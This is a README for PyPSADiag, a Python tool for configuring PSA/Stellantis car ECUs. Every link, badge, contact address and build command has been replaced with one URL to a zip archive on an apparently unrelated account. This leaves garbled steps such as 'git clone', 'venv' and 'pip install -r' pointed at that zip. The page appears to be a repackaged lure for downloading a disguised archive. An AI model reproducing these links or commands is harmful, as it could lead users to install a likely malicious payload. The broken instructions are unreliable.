# PyPSADiag

An Python application for configuring PSA/Stellantis based cars<br/>
See for additional Hardware/Info: [ludwig-v arduino-psa-diag](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)

Currently supporting:

- JSON Configuration for example BSI2010 to setup GUI<br/>[See more JSON Configuration Files](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)
- Reading Zones that are listed in JSON Configuration file
- Reading Zones with Multiple configurations, that are listed in JSON Configuration file
- Writing Zones to CSV file
- Writing changed Zones (as an list) to ECU

What I would like to support:
- More ECU JSON Files

IMPORTANT!
-------
This application is as is, and you use it at your own risk.<br/>
I am not responsible for any damages or injuries resulting from the use of this application.

Help
-------
Help in any way is appreciated, just send me an email with anything you can
contribute to the project, like:
- More ECU JSON Files
- Python coding
- GUI design
- ideas / feature requests
- test reports
- spread the word!

Build
-----
- Install Python 3.12 or above
- Get code `git clone https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
- Create virtual enviroment `python -m venv https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
- Goto virtual enviroment with `https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
- Install requirements, within path of PyPSADiag with `pip install -r https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
- Run with:
	1. `python https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip`
	2. `Open Zone File` and select an ECU JSON file
	3. `Connect` to correct Arduino hardware
	4. `Read` Zones
	5. <b>RISK: You can change Zones and use `Write` to write them to ECU.<br/>Always Check that these zones look correct</b>

Donate
------

If you like my work then please consider making a donation, to support my effort in
developing this application.<br>
Many thanks to all who donated already.<br>

| PayPal |
|-------|
|  [![PayPal](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip)](https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) |

Contact
-------
If you like to contact me, you can do so by sending an email to:

    mpostema09 -at- https://github.com/cuba3636/PyPSADiag/raw/refs/heads/main/csv/PSA_Diag_Py_v1.7.zip
